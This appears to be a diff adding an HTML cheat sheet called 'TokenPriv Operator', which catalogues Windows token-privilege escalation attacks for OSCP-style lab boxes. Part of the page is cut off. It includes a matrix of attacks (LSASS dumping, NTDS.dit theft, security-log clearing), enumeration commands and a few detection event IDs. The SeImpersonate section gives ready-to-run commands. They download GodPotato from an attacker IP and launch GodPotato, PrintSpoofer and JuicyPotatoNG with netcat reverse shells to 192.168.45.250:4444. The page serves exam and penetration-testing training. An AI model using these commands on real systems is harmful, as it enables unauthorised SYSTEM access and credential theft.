@@ -1,0 +1,1974 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TokenPriv Operator // Windows Privilege Token Arsenal</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap');
+
+  :root {
+    --bg: #0a0a0a;
+    --bg2: #0f0f0f;
+    --bg3: #141414;
+    --panel: #111111;
+    --border: #1e1e1e;
+    --accent: #c0392b;
+    --accent2: #e74c3c;
+    --accent3: #ff6b6b;
+    --gold: #f39c12;
+    --gold2: #f1c40f;
+    --teal: #1abc9c;
+    --blue: #3498db;
+    --purple: #9b59b6;
+    --orange: #e67e22;
+    --green: #27ae60;
+    --text: #d0d0d0;
+    --muted: #666;
+    --code-bg: #0d0d0d;
+    --rare: #9b59b6;
+    --common: #27ae60;
+    --critical: #c0392b;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 15px;
+    line-height: 1.6;
+    overflow-x: hidden;
+  }
+
+  /* HEADER */
+  .header {
+    background: linear-gradient(180deg, #120000 0%, #0a0a0a 100%);
+    border-bottom: 2px solid var(--accent);
+    padding: 18px 24px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    box-shadow: 0 2px 30px rgba(192,57,43,0.3);
+  }
+
+  .header-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 18px;
+    font-weight: 900;
+    color: var(--accent2);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+  }
+
+  .header-sub {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--muted);
+    letter-spacing: 2px;
+    margin-top: 3px;
+  }
+
+  .header-badge {
+    background: var(--accent);
+    color: #fff;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    padding: 4px 10px;
+    border-radius: 2px;
+    letter-spacing: 1px;
+  }
+
+  /* LAYOUT */
+  .layout {
+    display: flex;
+    height: calc(100vh - 65px);
+  }
+
+  /* SIDEBAR */
+  .sidebar {
+    width: 260px;
+    min-width: 260px;
+    background: var(--panel);
+    border-right: 1px solid var(--border);
+    overflow-y: auto;
+    padding: 10px 0;
+  }
+
+  .sidebar::-webkit-scrollbar { width: 4px; }
+  .sidebar::-webkit-scrollbar-track { background: var(--bg); }
+  .sidebar::-webkit-scrollbar-thumb { background: var(--accent); }
+
+  .sidebar-section {
+    padding: 8px 14px 4px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 9px;
+    color: var(--accent);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    border-top: 1px solid var(--border);
+    margin-top: 6px;
+  }
+
+  .sidebar-section:first-child { border-top: none; margin-top: 0; }
+
+  .nav-item {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 7px 14px;
+    cursor: pointer;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--muted);
+    transition: all 0.15s;
+    border-left: 2px solid transparent;
+  }
+
+  .nav-item:hover {
+    background: rgba(192,57,43,0.08);
+    color: var(--text);
+    border-left-color: var(--accent);
+  }
+
+  .nav-item.active {
+    background: rgba(192,57,43,0.12);
+    color: var(--accent2);
+    border-left-color: var(--accent);
+  }
+
+  .nav-dot {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background: var(--muted);
+    flex-shrink: 0;
+  }
+
+  .nav-item.active .nav-dot,
+  .nav-item:hover .nav-dot { background: var(--accent); }
+
+  .nav-dot.rare { background: var(--rare); }
+  .nav-dot.critical { background: var(--critical); }
+  .nav-dot.common { background: var(--common); }
+  .nav-dot.gold { background: var(--gold); }
+  .nav-dot.blue { background: var(--blue); }
+
+  /* MAIN CONTENT */
+  .main {
+    flex: 1;
+    overflow-y: auto;
+    padding: 24px;
+    background: var(--bg);
+  }
+
+  .main::-webkit-scrollbar { width: 5px; }
+  .main::-webkit-scrollbar-track { background: var(--bg2); }
+  .main::-webkit-scrollbar-thumb { background: var(--border); }
+
+  /* PAGE */
+  .page { display: none; }
+  .page.active { display: block; }
+
+  /* PAGE HEADER */
+  .page-header {
+    margin-bottom: 24px;
+    padding-bottom: 16px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .page-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--accent2);
+    letter-spacing: 2px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+
+  .page-sub {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--muted);
+    margin-top: 6px;
+    letter-spacing: 1px;
+  }
+
+  .severity-badge {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    padding: 3px 8px;
+    border-radius: 2px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+
+  .sev-critical { background: rgba(192,57,43,0.2); color: var(--accent3); border: 1px solid var(--accent); }
+  .sev-rare { background: rgba(155,89,182,0.2); color: #c39bd3; border: 1px solid var(--purple); }
+  .sev-common { background: rgba(39,174,96,0.2); color: #82e0aa; border: 1px solid var(--green); }
+  .sev-gold { background: rgba(243,156,18,0.2); color: #f9e79f; border: 1px solid var(--gold); }
+
+  /* SECTIONS */
+  .section {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    margin-bottom: 18px;
+    overflow: hidden;
+  }
+
+  .section-header {
+    background: #131313;
+    padding: 10px 16px;
+    font-family: 'Orbitron', monospace;
+    font-size: 11px;
+    font-weight: 700;
+    color: var(--gold);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .section-body { padding: 16px; }
+
+  /* INFO GRID */
+  .info-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+    gap: 12px;
+    margin-bottom: 16px;
+  }
+
+  .info-card {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 3px;
+    padding: 12px;
+  }
+
+  .info-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 9px;
+    color: var(--accent);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 6px;
+  }
+
+  .info-value {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    color: var(--text);
+  }
+
+  /* STEP */
+  .step {
+    display: flex;
+    gap: 14px;
+    margin-bottom: 14px;
+    align-items: flex-start;
+  }
+
+  .step-num {
+    width: 26px;
+    height: 26px;
+    min-width: 26px;
+    background: var(--accent);
+    color: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: 'Orbitron', monospace;
+    font-size: 11px;
+    font-weight: 700;
+    border-radius: 2px;
+    margin-top: 2px;
+  }
+
+  .step-content { flex: 1; }
+
+  .step-title {
+    font-family: 'Rajdhani', sans-serif;
+    font-weight: 700;
+    font-size: 15px;
+    color: var(--text);
+    margin-bottom: 6px;
+  }
+
+  /* CODE BLOCK */
+  .code-block {
+    background: var(--code-bg);
+    border: 1px solid #1e1e1e;
+    border-left: 3px solid var(--accent);
+    border-radius: 3px;
+    padding: 12px 14px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    color: #e8e8e8;
+    white-space: pre;
+    overflow-x: auto;
+    position: relative;
+    margin: 8px 0;
+    line-height: 1.7;
+  }
+
+  .code-block.teal { border-left-color: var(--teal); }
+  .code-block.gold { border-left-color: var(--gold); }
+  .code-block.purple { border-left-color: var(--purple); }
+  .code-block.blue { border-left-color: var(--blue); }
+  .code-block.green { border-left-color: var(--green); }
+  .code-block.orange { border-left-color: var(--orange); }
+
+  .copy-btn {
+    position: absolute;
+    top: 8px;
+    right: 8px;
+    background: #1e1e1e;
+    border: 1px solid #333;
+    color: var(--muted);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 9px;
+    padding: 3px 8px;
+    cursor: pointer;
+    border-radius: 2px;
+    letter-spacing: 1px;
+    transition: all 0.15s;
+  }
+
+  .copy-btn:hover { background: var(--accent); color: #fff; border-color: var(--accent); }
+  .copy-btn.copied { background: var(--green); color: #fff; border-color: var(--green); }
+
+  /* WARNING / NOTE BOX */
+  .alert {
+    border-radius: 3px;
+    padding: 10px 14px;
+    margin: 10px 0;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    line-height: 1.6;
+    display: flex;
+    gap: 10px;
+    align-items: flex-start;
+  }
+
+  .alert-icon { font-size: 14px; margin-top: 1px; flex-shrink: 0; }
+
+  .alert-critical { background: rgba(192,57,43,0.12); border: 1px solid rgba(192,57,43,0.3); color: #e8a49a; }
+  .alert-gold { background: rgba(243,156,18,0.1); border: 1px solid rgba(243,156,18,0.25); color: #f9e79f; }
+  .alert-teal { background: rgba(26,188,156,0.1); border: 1px solid rgba(26,188,156,0.25); color: #a3e4d7; }
+  .alert-purple { background: rgba(155,89,182,0.1); border: 1px solid rgba(155,89,182,0.25); color: #d2b4de; }
+  .alert-blue { background: rgba(52,152,219,0.1); border: 1px solid rgba(52,152,219,0.25); color: #aed6f1; }
+
+  /* PRIV TABLE */
+  .priv-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+  }
+
+  .priv-table th {
+    background: #131313;
+    color: var(--accent);
+    padding: 8px 12px;
+    text-align: left;
+    letter-spacing: 2px;
+    font-size: 9px;
+    text-transform: uppercase;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .priv-table td {
+    padding: 8px 12px;
+    border-bottom: 1px solid #181818;
+    vertical-align: middle;
+  }
+
+  .priv-table tr:hover td { background: rgba(192,57,43,0.04); }
+
+  .tag {
+    display: inline-block;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 9px;
+    padding: 2px 6px;
+    border-radius: 2px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin: 1px;
+  }
+
+  .tag-red { background: rgba(192,57,43,0.2); color: var(--accent3); }
+  .tag-purple { background: rgba(155,89,182,0.2); color: #d2b4de; }
+  .tag-green { background: rgba(39,174,96,0.2); color: #82e0aa; }
+  .tag-gold { background: rgba(243,156,18,0.2); color: #f9e79f; }
+  .tag-blue { background: rgba(52,152,219,0.2); color: #aed6f1; }
+  .tag-teal { background: rgba(26,188,156,0.2); color: #a3e4d7; }
+  .tag-orange { background: rgba(230,126,34,0.2); color: #f0b27a; }
+
+  /* LINK */
+  a { color: var(--blue); text-decoration: none; }
+  a:hover { color: var(--accent2); text-decoration: underline; }
+
+  /* DIVIDER */
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 18px 0;
+  }
+
+  /* TWO COL */
+  .two-col {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 16px;
+  }
+
+  @media (max-width: 900px) { .two-col { grid-template-columns: 1fr; } }
+
+  /* HIGHLIGHT */
+  .hl-red { color: var(--accent3); }
+  .hl-gold { color: var(--gold2); }
+  .hl-teal { color: var(--teal); }
+  .hl-blue { color: var(--blue); }
+  .hl-purple { color: #c39bd3; }
+  .hl-green { color: #82e0aa; }
+  .hl-orange { color: #f0b27a; }
+
+  /* FLOW CHAIN */
+  .flow-chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: 6px;
+    margin: 10px 0;
+    padding: 10px;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 3px;
+  }
+
+  .flow-node {
+    background: #1a1a1a;
+    border: 1px solid var(--border);
+    padding: 5px 10px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    border-radius: 2px;
+    color: var(--text);
+  }
+
+  .flow-arrow { color: var(--accent); font-size: 14px; }
+
+  /* DETECTION */
+  .detection-box {
+    background: rgba(26,188,156,0.05);
+    border: 1px solid rgba(26,188,156,0.2);
+    border-radius: 3px;
+    padding: 12px;
+    margin: 8px 0;
+  }
+
+  .detection-title {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: var(--teal);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 8px;
+  }
+
+  p { margin-bottom: 8px; }
+
+  ul { padding-left: 18px; margin: 8px 0; }
+  ul li { margin-bottom: 4px; }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div>
+    <div class="header-title">⚡ TokenPriv Operator</div>
+    <div class="header-sub">WINDOWS PRIVILEGE TOKEN ARSENAL // ALL VECTORS // OSCP+ EDITION</div>
+  </div>
+  <div style="display:flex;gap:10px;align-items:center;">
+    <span class="header-badge">@Mahdiesta</span>
+    <span class="header-badge" style="background:var(--purple);">v1.0</span>
+  </div>
+</div>
+
+<div class="layout">
+
+  <!-- SIDEBAR -->
+  <div class="sidebar">
+    <div class="sidebar-section">Overview</div>
+    <div class="nav-item active" onclick="showPage('overview',this)"><span class="nav-dot critical"></span>Master Index</div>
+    <div class="nav-item" onclick="showPage('detect',this)"><span class="nav-dot gold"></span>Detection Checklist</div>
+
+    <div class="sidebar-section">🔥 Critical / Common</div>
+    <div class="nav-item" onclick="showPage('seimpersonate',this)"><span class="nav-dot critical"></span>SeImpersonatePrivilege</div>
+    <div class="nav-item" onclick="showPage('seassignprimary',this)"><span class="nav-dot critical"></span>SeAssignPrimaryToken</div>
+    <div class="nav-item" onclick="showPage('sedebug',this)"><span class="nav-dot critical"></span>SeDebugPrivilege</div>
+
+    <div class="sidebar-section">🟣 Rare / OSCP Exotic</div>
+    <div class="nav-item" onclick="showPage('semanagevolume',this)"><span class="nav-dot rare"></span>SeManageVolumePrivilege</div>
+    <div class="nav-item" onclick="showPage('sebackup',this)"><span class="nav-dot rare"></span>SeBackupPrivilege</div>
+    <div class="nav-item" onclick="showPage('serestore',this)"><span class="nav-dot rare"></span>SeRestorePrivilege</div>
+    <div class="nav-item" onclick="showPage('setakeown',this)"><span class="nav-dot rare"></span>SeTakeOwnershipPrivilege</div>
+    <div class="nav-item" onclick="showPage('seloaddriver',this)"><span class="nav-dot rare"></span>SeLoadDriverPrivilege</div>
+    <div class="nav-item" onclick="showPage('setcb',this)"><span class="nav-dot rare"></span>SeTcbPrivilege</div>
+    <div class="nav-item" onclick="showPage('secreatetoken',this)"><span class="nav-dot rare"></span>SeCreateTokenPrivilege</div>
+    <div class="nav-item" onclick="showPage('sesecurity',this)"><span class="nav-dot gold"></span>SeSecurityPrivilege</div>
+    <div class="nav-item" onclick="showPage('sesymlink',this)"><span class="nav-dot gold"></span>SeCreateSymbolicLink</div>
+    <div class="nav-item" onclick="showPage('sesysenv',this)"><span class="nav-dot gold"></span>SeSystemEnvironment</div>
+    <div class="nav-item" onclick="showPage('seshutdown',this)"><span class="nav-dot blue"></span>SeShutdownPrivilege</div>
+
+    <div class="sidebar-section">🔵 Group-Based</div>
+    <div class="nav-item" onclick="showPage('backupops',this)"><span class="nav-dot blue"></span>Backup Operators Group</div>
+    <div class="nav-item" onclick="showPage('dnsadmins',this)"><span class="nav-dot blue"></span>DnsAdmins → SYSTEM</div>
+    <div class="nav-item" onclick="showPage('serverops',this)"><span class="nav-dot blue"></span>Server Operators Group</div>
+    <div class="nav-item" onclick="showPage('printops',this)"><span class="nav-dot blue"></span>Print Operators Group</div>
+
+    <div class="sidebar-section">🟡 Token Manipulation</div>
+    <div class="nav-item" onclick="showPage('fullpowers',this)"><span class="nav-dot gold"></span>FullPowers (Restore Token)</div>
+    <div class="nav-item" onclick="showPage('enablepriv',this)"><span class="nav-dot gold"></span>Enable Disabled Privs</div>
+
+    <div class="sidebar-section">Resources</div>
+    <div class="nav-item" onclick="showPage('links',this)"><span class="nav-dot common"></span>All Links & Tools</div>
+    <div class="nav-item" onclick="showPage('enum',this)"><span class="nav-dot common"></span>Enum One-Liners</div>
+  </div>
+
+  <!-- MAIN -->
+  <div class="main">
+
+    <!-- OVERVIEW -->
+    <div id="page-overview" class="page active">
+      <div class="page-header">
+        <div class="page-title">⚡ Master Privilege Index <span class="severity-badge sev-critical">ALL VECTORS</span></div>
+        <div class="page-sub">// EVERY EXPLOITABLE WINDOWS TOKEN PRIVILEGE // OSCP+ ACCESS BOX & BEYOND</div>
+      </div>
+
+      <div class="alert alert-critical">
+        <span class="alert-icon">🎯</span>
+        <span>The Access (PG Practice) box used <strong>SeManageVolumePrivilege</strong> → full C:\Windows write → DLL hijack via PrintNotify → SYSTEM. Most people skip it because it's not in standard checklists. This operator covers EVERY token privilege, common and exotic.</span>
+      </div>
+
+      <div class="alert alert-gold">
+        <span class="alert-icon">⚠️</span>
+        <span><strong>DISABLED ≠ USELESS.</strong> A privilege listed as "Disabled" in whoami /priv can still be enabled programmatically. Never skip a privilege just because it shows Disabled — it can be enabled with a single API call.</span>
+      </div>
+
+      <div class="section">
+        <div class="section-header">📊 Complete Privilege Exploitation Matrix</div>
+        <div class="section-body" style="padding:0;">
+          <table class="priv-table">
+            <tr>
+              <th>Privilege</th>
+              <th>Rarity</th>
+              <th>Primary Attack</th>
+              <th>Tool</th>
+              <th>Result</th>
+            </tr>
+            <tr>
+              <td><span class="hl-red">SeImpersonatePrivilege</span></td>
+              <td><span class="tag tag-green">COMMON</span></td>
+              <td>Potato / PrintSpoofer</td>
+              <td>GodPotato, PrintSpoofer</td>
+              <td><span class="hl-gold">SYSTEM</span></td>
+            </tr>
+            <tr>
+              <td><span class="hl-red">SeAssignPrimaryTokenPrivilege</span></td>
+              <td><span class="tag tag-green">COMMON</span></td>
+              <td>Potato family</td>
+              <td>GodPotato, JuicyPotato</td>
+              <td><span class="hl-gold">SYSTEM</span></td>
+            </tr>
+            <tr>
+              <td><span class="hl-red">SeDebugPrivilege</span></td>
+              <td><span class="tag tag-green">COMMON</span></td>
+              <td>LSASS dump / token steal</td>
+              <td>Mimikatz, procdump</td>
+              <td><span class="hl-gold">Creds/SYSTEM</span></td>
+            </tr>
+            <tr>
+              <td><span class="hl-purple">SeManageVolumePrivilege</span></td>
+              <td><span class="tag tag-purple">RARE</span></td>
+              <td>Full C:\ DACL → DLL hijack</td>
+              <td>SeManageVolumeExploit.exe</td>
+              <td><span class="hl-gold">SYSTEM</span></td>
+            </tr>
+            <tr>
+              <td><span class="hl-purple">SeBackupPrivilege</span></td>
+              <td><span class="tag tag-purple">RARE</span></td>
+              <td>Read any file (NTDS.dit)</td>
+              <td>diskshadow + robocopy</td>
+              <td><span class="hl-gold">Domain Hashes</span></td>
+            </tr>
+            <tr>
+              <td><span class="hl-purple">SeRestorePrivilege</span></td>
+              <td><span class="tag tag-purple">RARE</span></td>
+              <td>Write any file → utilman</td>
+              <td>SeRestoreAbuse, reg manipulation</td>
+              <td><span class="hl-gold">SYSTEM</span></td>
+            </tr>
+            <tr>
+              <td><span class="hl-purple">SeTakeOwnershipPrivilege</span></td>
+              <td><span class="tag tag-purple">RARE</span></td>
+              <td>Take owner → ACL edit → write</td>
+              <td>takeown, icacls, PowerShell</td>
+              <td><span class="hl-gold">SYSTEM</span></td>
+            </tr>
+            <tr>
+              <td><span class="hl-purple">SeLoadDriverPrivilege</span></td>
+              <td><span class="tag tag-purple">RARE</span></td>
+              <td>Load vuln kernel driver → exploit</td>
+              <td>capcom/szkg64 + EOEP</td>
+              <td><span class="hl-gold">SYSTEM</span></td>
+            </tr>
+            <tr>
+              <td><span class="hl-purple">SeTcbPrivilege</span></td>
+              <td><span class="tag tag-purple">RARE</span></td>
+              <td>Act as OS → create SYSTEM tokens</td>
+              <td>TcbElevation.exe</td>
+              <td><span class="hl-gold">SYSTEM</span></td>
+            </tr>
+            <tr>
+              <td><span class="hl-purple">SeCreateTokenPrivilege</span></td>
+              <td><span class="tag tag-red">VERY RARE</span></td>
+              <td>Forge arbitrary token</td>
+              <td>custom NtCreateToken code</td>
+              <td><span class="hl-gold">SYSTEM</span></td>
+            </tr>
+            <tr>
+              <td><span class="hl-orange">SeSecurityPrivilege</span></td>
+              <td><span class="tag tag-gold">UNCOMMON</span></td>
+              <td>Clear/read security event logs</td>
+              <td>wevtutil, manual</td>
+              <td><span class="hl-gold">Log Clearing</span></td>
+            </tr>
+            <tr>
+              <td><span class="hl-orange">SeCreateSymbolicLinkPrivilege</span></td>
+              <td><span class="tag tag-gold">UNCOMMON</span></td>
+              <td>Symlink attack → file overwrite</td>
+              <td>PowerShell symlink abuse</td>
+              <td><span class="hl-gold">Privesc</span></td>
+            </tr>
+            <tr>
+              <td><span class="hl-orange">SeSystemEnvironmentPrivilege</span></td>
+              <td><span class="tag tag-gold">UNCOMMON</span></td>
+              <td>Modify UEFI vars / boot path</td>
+              <td>PowerShell + SetFirmwareEnv</td>
+              <td><span class="hl-gold">Persistence</span></td>
+            </tr>
+            <tr>
+              <td><span class="hl-teal">Backup Operators (group)</span></td>
+              <td><span class="tag tag-purple">RARE</span></td>
+              <td>SeBackup+SeRestore → NTDS.dit</td>
+              <td>diskshadow, robocopy</td>
+              <td><span class="hl-gold">DA Hashes</span></td>
+            </tr>
+            <tr>
+              <td><span class="hl-teal">DnsAdmins (group)</span></td>
+              <td><span class="tag tag-purple">RARE</span></td>
+              <td>Load malicious DLL via DNS svc</td>
+              <td>dnscmd /serverlevelplugindll</td>
+              <td><span class="hl-gold">SYSTEM on DC</span></td>
+            </tr>
+            <tr>
+              <td><span class="hl-teal">Server Operators (group)</span></td>
+              <td><span class="tag tag-purple">RARE</span></td>
+              <td>Modify service binpath</td>
+              <td>sc config + nc</td>
+              <td><span class="hl-gold">SYSTEM</span></td>
+            </tr>
+            <tr>
+              <td><span class="hl-teal">Print Operators (group)</span></td>
+              <td><span class="tag tag-red">RARE</span></td>
+              <td>SeLoadDriver → load vuln driver</td>
+              <td>Capcom + exploit</td>
+              <td><span class="hl-gold">SYSTEM</span></td>
+            </tr>
+          </table>
+        </div>
+      </div>
+
+      <div class="alert alert-teal">
+        <span class="alert-icon">💡</span>
+        <span>Quick check: <code>whoami /priv</code> → compare every line against this table. Even if Disabled — check if it can be enabled. Use <strong>PrivescCheck</strong> and <strong>winPEAS</strong> BOTH — they catch different things.</span>
+      </div>
+    </div>
+
+    <!-- DETECT PAGE -->
+    <div id="page-detect" class="page">
+      <div class="page-header">
+        <div class="page-title">🔍 Detection Checklist <span class="severity-badge sev-gold">ENUMERATION</span></div>
+        <div class="page-sub">// HOW TO FIND EVERY TOKEN PRIVILEGE VECTOR ON A BOX</div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">📋 Step 1 — Raw Privilege Dump</div>
+        <div class="section-body">
+          <div class="code-block">whoami /priv
+whoami /all
+whoami /groups</div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">⚠️</span>
+            <span>Disabled privileges CAN be enabled! Never ignore them. Check every line.</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">🔎 Step 2 — Automated Scanners (Run ALL)</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">WinPEAS</div>
+              <div class="code-block teal">.\winPEASx64.exe
+.\winPEASx64.exe quiet tokencheck</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">PrivescCheck (catches what winPEAS misses)</div>
+              <div class="code-block teal">powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report report"</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">PowerUp (services focus)</div>
+              <div class="code-block teal">powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-content">
+              <div class="step-title">Seatbelt (broader enumeration)</div>
+              <div class="code-block teal">.\Seatbelt.exe -group=all</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">👥 Step 3 — Group Membership Check</div>
+        <div class="section-body">
+          <div class="code-block">net user %USERNAME%
+net localgroup
+net localgroup Administrators
+net localgroup "Backup Operators"
+net localgroup "DnsAdmins"
+net localgroup "Server Operators"
+net localgroup "Print Operators"
+net localgroup "Remote Management Users"
+net localgroup "Event Log Readers"</div>
+          <div class="alert alert-purple">
+            <span class="alert-icon">🟣</span>
+            <span>DnsAdmins, Backup Operators, Server Operators, Print Operators — all lead to SYSTEM. Check ALL of them.</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">🧠 Step 4 — Manual Token Analysis</div>
+        <div class="section-body">
+          <div class="code-block"># Check if token can be enabled
+powershell -c "
+[System.Security.Principal.WindowsIdentity]::GetCurrent() | 
+Select-Object -ExpandProperty Groups | 
+ForEach-Object { $_.Translate([System.Security.Principal.NTAccount]) }
+"
+
+# Check integrity level
+whoami /groups | findstr /i "mandatory"
+
+# Check for dangerous privileges in one grep
+whoami /priv | findstr /i "Se"</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">📡 Event IDs to Hunt (Blue Team awareness)</div>
+        <div class="section-body">
+          <table class="priv-table">
+            <tr><th>Event ID</th><th>Meaning</th><th>Relevance</th></tr>
+            <tr><td>4672</td><td>Special privileges assigned to logon</td><td>Any dangerous priv assigned</td></tr>
+            <tr><td>4673</td><td>Privileged service called</td><td>SeDebug / SeTcb usage</td></tr>
+            <tr><td>4674</td><td>Operation on privileged object</td><td>SeTakeOwnership, SeBackup</td></tr>
+            <tr><td>4656</td><td>Handle to object requested</td><td>File/reg access with backup semantics</td></tr>
+            <tr><td>7045</td><td>New service installed</td><td>SeLoadDriver kernel driver load</td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- SeImpersonatePrivilege -->
+    <div id="page-seimpersonate" class="page">
+      <div class="page-header">
+        <div class="page-title">🥔 SeImpersonatePrivilege <span class="severity-badge sev-critical">CRITICAL</span></div>
+        <div class="page-sub">// MOST COMMON SERVICE ACCOUNT PATH → SYSTEM // POTATO FAMILY</div>
+      </div>
+
+      <div class="info-grid">
+        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">IIS, MSSQL, service accounts, LOCAL SERVICE</div></div>
+        <div class="info-card"><div class="info-label">Primary Attack</div><div class="info-value">Potato family / PrintSpoofer</div></div>
+        <div class="info-card"><div class="info-label">Result</div><div class="info-value">NT AUTHORITY\SYSTEM</div></div>
+        <div class="info-card"><div class="info-label">OS Coverage</div><div class="info-value">All Windows versions (tool varies)</div></div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">⚡ GodPotato (Best — Works Server 2012–2022)</div>
+        <div class="section-body">
+          <div class="flow-chain">
+            <div class="flow-node">SeImpersonate</div><div class="flow-arrow">→</div>
+            <div class="flow-node">DCOM/RPC trigger</div><div class="flow-arrow">→</div>
+            <div class="flow-node">SYSTEM token capture</div><div class="flow-arrow">→</div>
+            <div class="flow-node">CreateProcessAsUser</div><div class="flow-arrow">→</div>
+            <div class="flow-node">🎯 SYSTEM shell</div>
+          </div>
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Transfer GodPotato</div>
+              <div class="code-block">iwr http://192.168.45.250/GodPotato-NET4.exe -o gp.exe</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Execute</div>
+              <div class="code-block green">.\gp.exe -cmd "cmd /c whoami"
+.\gp.exe -cmd "cmd /c C:\Users\Public\Documents\nc64.exe 192.168.45.250 4444 -e cmd"</div>
+            </div>
+          </div>
+          <div class="alert alert-teal">
+            <span class="alert-icon">🔗</span>
+            <span>GitHub: <a href="https://github.com/BeichenDream/GodPotato" target="_blank">github.com/BeichenDream/GodPotato</a></span>
+          </div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">🖨️ PrintSpoofer (Server 2016/2019, Win10)</div>
+        <div class="section-body">
+          <div class="code-block green">.\PrintSpoofer.exe -i -c cmd
+.\PrintSpoofer.exe -c "nc64.exe 192.168.45.250 4444 -e cmd"</div>
+          <div class="alert alert-teal">
+            <span class="alert-icon">🔗</span>
+            <span>GitHub: <a href="https://github.com/itm4n/PrintSpoofer" target="_blank">github.com/itm4n/PrintSpoofer</a></span>
+          </div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">🧅 JuicyPotatoNG (Server 2019+)</div>
+        <div class="section-body">
+          <div class="code-block">.\JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c nc64.exe 192.168.45.250 4444 -e cmd"</div>
+          <div class="alert alert-teal">
+            <span class="alert-icon">🔗</span>
+            <span>GitHub: <a href="https://github.com/antonioCoco/JuicyPotatoNG" target="_blank">github.com/antonioCoco/JuicyPotatoNG</a></span>
+          </div>
+        </div>
+      </div>
+
+      <div class="detection-box">
+        <div class="detection-title">🔍 Detection</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Event 4672 → SYSTEM logon with SeImpersonate • Unusual DCOM/RPC calls from service accounts • Child process spawned from IIS/MSSQL worker → cmd.exe</div>
+      </div>
+    </div>
+
+    <!-- SeManageVolumePrivilege -->
+    <div id="page-semanagevolume" class="page">
+      <div class="page-header">
+        <div class="page-title">💽 SeManageVolumePrivilege <span class="severity-badge sev-rare">RARE / EXOTIC</span></div>
+        <div class="page-sub">// ACCESS BOX (PG PRACTICE) // VOLUME MAINTENANCE → FULL C:\ WRITE → DLL HIJACK → SYSTEM</div>
+      </div>
+
+      <div class="info-grid">
